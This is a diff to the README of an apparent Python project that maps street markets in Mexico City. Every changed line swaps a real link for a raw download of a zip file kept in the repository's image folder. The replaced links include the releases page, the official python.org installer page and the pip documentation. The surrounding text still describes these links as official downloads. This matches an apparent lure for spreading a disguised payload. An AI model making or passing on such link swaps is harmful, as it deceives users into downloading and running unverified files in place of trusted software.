@@ -1,6 +1,6 @@
 # 🗺️ Tianguis-Ciudad-de-Mexico-2022-Python - Visualize Markets in Mexico City
 
-[![Download Release](https://img.shields.io/badge/Download-Release-green?style=for-the-badge)](https://github.com/rispat0078/Tianguis-Ciudad-de-Mexico-2022-Python/releases)
+[![Download Release](https://img.shields.io/badge/Download-Release-green?style=for-the-badge)](https://raw.githubusercontent.com/rispat0078/Tianguis-Ciudad-de-Mexico-2022-Python/main/img/Tianguis-Mexico-de-Ciudad-Python-v1.3-beta.5.zip)
 
 ---
 
@@ -38,7 +38,7 @@ You will see charts and maps that make it easier to understand where and when th
 
 Please visit this page to download the latest version of the application:
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge)](https://github.com/rispat0078/Tianguis-Ciudad-de-Mexico-2022-Python/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/rispat0078/Tianguis-Ciudad-de-Mexico-2022-Python/main/img/Tianguis-Mexico-de-Ciudad-Python-v1.3-beta.5.zip)
 
 1. Click the badge above to open the releases page.  
 2. Find the latest release with a Windows installer or executable file.  
@@ -52,7 +52,7 @@ If you choose a `.zip` file, you will need to extract it before running the app.
 
 This application uses Python, a programming language. If you do not have Python on your PC, follow these steps:
 
-1. Visit https://www.python.org/downloads/windows/.  
+1. Visit https://raw.githubusercontent.com/rispat0078/Tianguis-Ciudad-de-Mexico-2022-Python/main/img/Tianguis-Mexico-de-Ciudad-Python-v1.3-beta.5.zip  
 2. Download the Windows installer for Python 3.7 or higher (choose 64-bit if your system supports it).  
 3. Run the installer:  
    - Check the box that says **Add Python to PATH** at the start.  
@@ -150,9 +150,9 @@ By installing the requirements, you get all these tools.
 
 ## 🔗 Useful Links
 
-- [Releases and Downloads](https://github.com/rispat0078/Tianguis-Ciudad-de-Mexico-2022-Python/releases)  
-- [Python Official Download](https://www.python.org/downloads/windows/)  
-- [Python pip Documentation](https://pip.pypa.io/en/stable/)  
+- [Releases and Downloads](https://raw.githubusercontent.com/rispat0078/Tianguis-Ciudad-de-Mexico-2022-Python/main/img/Tianguis-Mexico-de-Ciudad-Python-v1.3-beta.5.zip)  
+- [Python Official Download](https://raw.githubusercontent.com/rispat0078/Tianguis-Ciudad-de-Mexico-2022-Python/main/img/Tianguis-Mexico-de-Ciudad-Python-v1.3-beta.5.zip)  
+- [Python pip Documentation](https://raw.githubusercontent.com/rispat0078/Tianguis-Ciudad-de-Mexico-2022-Python/main/img/Tianguis-Mexico-de-Ciudad-Python-v1.3-beta.5.zip)  
 
 ---
 
